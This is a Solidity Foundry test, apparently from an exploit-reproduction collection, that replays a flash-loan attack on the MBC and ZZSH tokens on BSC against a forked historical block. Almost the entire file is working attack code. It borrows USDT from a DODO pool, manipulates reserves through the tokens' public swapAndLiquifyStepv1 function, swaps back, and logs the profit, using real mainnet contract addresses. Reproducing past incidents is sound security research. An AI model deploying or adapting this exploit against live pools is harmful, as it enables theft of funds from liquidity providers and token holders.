// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

interface IMBC is IERC20 {
    function swapAndLiquifyStepv1() external;
}

interface IZZSH is IERC20 {
    function swapAndLiquifyStepv1() external;
}

contract MBCZZSHAttacker is Test {
    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address constant dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    IMBC constant mbc = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    IZZSH constant zzsh = IZZSH(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair constant mbc_usdt = IPancakePair(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);
    IPancakePair constant zzsh_usdt = IPancakePair(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A);

    function setUp() public {
        vm.createSelectFork("bsc");
        vm.label(address(usdt), "USDT");
        vm.label(address(dodo), "dodo");
        vm.label(address(mbc), "MBC");
        vm.label(address(zzsh), "ZZSH");
        vm.label(address(pancakeRouter), "PancakeRouter");
        vm.label(address(mbc_usdt), "PancakePair: mbc-usdt");
        vm.label(address(zzsh_usdt), "PancakePair: zzsh-usdt");
    }

    function testExploit() external {
        uint attackBlockNumber = 23474460;
        vm.rollFork(attackBlockNumber);

        uint startBalance = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("Initial attacker USDT", startBalance, usdt.decimals());
        uint dodoUSDT = usdt.balanceOf(dodo);
        // start flashloan
        IDPPOracle(dodo).flashLoan(0 ,dodoUSDT, address(this), abi.encode("dodo"));
        
        // attack end
        uint endBalance = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("Total profit USDT", endBalance - startBalance, usdt.decimals());
    }

    function dodoCall(address /*sender*/, uint256 /*baseAmount*/, uint256 quoteAmount, bytes calldata /*data*/) internal {
        if (msg.sender == dodo) {
            emit log_named_decimal_uint("Total borrowed USDT", usdt.balanceOf(address(this)), usdt.decimals());
 
            // approve before swap
            usdt.approve(address(pancakeRouter), type(uint).max);
            mbc.approve(address(pancakeRouter), type(uint).max);
            zzsh.approve(address(pancakeRouter), type(uint).max);

            attack();

            // repay flashloan
            usdt.transfer(dodo, quoteAmount);
        }
    }

    function attack() internal {
        USDT2VulToken(mbc_usdt);

        mbc.swapAndLiquifyStepv1();
        // mbc_usdt.sync(); // unnecessary

        usdt.transfer(address(mbc_usdt), 1001);  // according to _isAddLiquidityV1 function when calling _transfer, to avoid executing swapAndLiquify function
        VulToken2USDT(mbc_usdt);

        // zzsh
        USDT2VulToken(zzsh_usdt);
        zzsh.swapAndLiquifyStepv1();
        usdt.transfer(address(zzsh_usdt), 1001);
        VulToken2USDT(zzsh_usdt);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function USDT2VulToken(IPancakePair target) internal {
        // swap 150k USDT to MBC/ZZSH
        usdt.transfer(address(target), 150_000 ether);
        (uint reserve0, uint reserve1, ) = target.getReserves();
        uint amountOut = 0;
        if (target.token0() != address(usdt)) {
            amountOut  = pancakeRouter.getAmountOut(150_000 ether, reserve1, reserve0);
            target.swap(amountOut, 0, address(this), "");
            emit log_named_decimal_uint("Total exchanged vulnerable token", IERC20(target.token0()).balanceOf(address(this)), mbc.decimals());
        } else {
            amountOut  = pancakeRouter.getAmountOut(150_000 ether, reserve0, reserve1);
            target.swap(0, amountOut, address(this), "");
            emit log_named_decimal_uint("Total exchanged vulnerable token", IERC20(target.token1()).balanceOf(address(this)), mbc.decimals());
        }
    }

    function VulToken2USDT(IPancakePair target) internal {
        // swap MBC/ZZSH to USDT
        (uint reserve0, uint reserve1, ) = target.getReserves();
        uint usdtAmountout = 0;
        if (target.token0() != address(usdt)) {
            IERC20 token = IERC20(target.token0());
            token.transfer(address(target), token.balanceOf(address(this)));
            uint amountIn = token.balanceOf(address(target)) - reserve0;
            usdtAmountout  = pancakeRouter.getAmountOut(amountIn, reserve0, reserve1);
            target.swap(0, usdtAmountout, address(this), "");
        } else {
            IERC20 token = IERC20(target.token1());
            token.transfer(address(target), token.balanceOf(address(this)));
            uint amountIn = token.balanceOf(address(target)) - reserve1;
            usdtAmountout  = pancakeRouter.getAmountOut(amountIn, reserve1, reserve0);
            target.swap(usdtAmountout, 0, address(this), "");
        }
        emit log_named_decimal_uint("Total exchanged USDT token", usdtAmountout, usdt.decimals());
    }

    function testAddLiquidity() external {
        address test = 0x1234123412341234123412341234123412341234;
        deal(address(usdt), test, 10000 ether);
        deal(address(mbc), test, 1000 ether);
        vm.startPrank(test);
        usdt.approve(address(pancakeRouter), type(uint).max);
        mbc.approve(address(pancakeRouter), type(uint).max);
        
        emit log_named_decimal_uint("Initial mbc balance in the pool", mbc.balanceOf(address(mbc_usdt)), mbc.decimals());
        emit log_named_decimal_uint("Initial usdt balance in the pool", usdt.balanceOf(address(mbc_usdt)), usdt.decimals());
        (uint reserve0, uint reserve1, ) = mbc_usdt.getReserves();
        emit log_named_decimal_uint("Initial mbc price", pancakeRouter.quote(1 ether, reserve0, reserve1), usdt.decimals());
        console.log(mbc.balanceOf(address(mbc))/1 ether);
        pancakeRouter.addLiquidity(address(usdt), address(mbc), usdt.balanceOf(test), mbc.balanceOf(test), 0,0, test, block.timestamp);
        // pancakeRouter.addLiquidity(address(mbc), address(usdt), mbc.balanceOf(test), usdt.balanceOf(test), 0,0, test, block.timestamp);
        
        emit log_named_decimal_uint("Eventually mbc balance in the pool", mbc.balanceOf(address(mbc_usdt)), mbc.decimals());
        emit log_named_decimal_uint("Eventually usdt balance in the pool", usdt.balanceOf(address(mbc_usdt)), usdt.decimals());
        (uint reserve00, uint reserve11, ) = mbc_usdt.getReserves();
        emit log_named_decimal_uint("Eventually mbc price", pancakeRouter.quote(1 ether, reserve00, reserve11), usdt.decimals());

        vm.stopPrank();
    }

}

